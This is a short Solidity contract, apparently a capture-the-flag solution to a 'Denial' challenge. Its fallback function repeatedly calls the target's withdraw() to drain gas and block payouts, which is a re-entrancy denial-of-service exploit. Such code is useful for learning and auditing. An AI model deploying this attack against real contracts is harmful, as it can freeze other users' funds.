// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    /// @dev Drain gas by infinite looping withdrawal calls
    fallback() external payable {
        Denial(contractAddress).withdraw();
    }
}
